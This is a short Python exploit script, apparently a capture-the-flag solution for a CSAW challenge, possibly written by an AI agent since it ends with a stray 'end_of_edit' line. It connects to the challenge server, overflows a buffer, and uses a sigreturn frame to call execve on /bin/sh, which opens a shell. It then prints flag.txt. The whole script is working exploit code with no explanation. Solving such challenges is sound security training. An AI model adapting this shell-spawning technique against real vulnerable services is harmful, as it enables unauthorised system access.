from pwn import *

context.arch = 'amd64'

syscall_ret = 0x400185
mov_eax_0xf_syscall = 0x400180
binsh = 0x4001ca

p = remote("pwn.chal.csaw.io", 8000)

frame = SigreturnFrame()
frame.rax = 59  # execve
frame.rdi = binsh
frame.rsi = 0
frame.rdx = 0
frame.rip = syscall_ret

payload = b'A' * 40
payload += p64(mov_eax_0xf_syscall)
payload += bytes(frame)

p.send(payload)
p.sendline(b'cat flag.txt')
print(p.recvall(timeout=5).decode('latin-1'))
end_of_edit

